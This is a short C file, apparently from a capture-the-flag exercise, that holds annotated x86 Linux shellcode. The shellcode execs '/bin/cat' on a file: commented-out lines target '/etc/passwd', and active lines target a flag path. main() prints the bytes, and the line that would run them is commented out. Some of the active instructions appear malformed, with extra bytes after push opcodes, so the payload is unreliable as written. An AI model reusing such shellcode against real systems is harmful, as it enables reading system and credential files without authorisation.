#include <stdio.h>

const char shellcode[]="\x31\xc0" // xorl %eax,%eax
"\x99" // cdq
"\x52" // push edx
"\x68\x2f\x63\x61\x74" // push dword 0x7461632f // "/cat"
"\x68\x2f\x62\x69\x6e" // push dword 0x6e69622f // "/bin"
"\x89\xe3" // mov ebx,esp
"\x52" // push edx
/*"\x68\x73\x73\x77\x64" // pu sh dword 0x64777373 // "sswd"*/
/*"\x68\x2f\x2f\x70\x61" // push dword 0x61702f2f // "//pa"*/
/*"\x68\x2f\x65\x74\x63" // push dword 0x6374652f // "/etc"*/
"\x68\x2f\x67\x61\x6c\x66" // "flag"
"\x68\x2f\x7e\x2f\x2f\x2e" // "~//."
"\x89\xe1" // mov ecx,esp
"\xb0\x0b" // mov $0xb,%al
"\x52" // push edx
"\x51" // push ecx
"\x53" // push ebx
"\x89\xe1" // mov ecx,esp
"\xcd\x80" ; // int 80h

int main()
{
        /*(*(void (*)()) shellcode)();*/
        puts(shellcode);

        return 0;
}
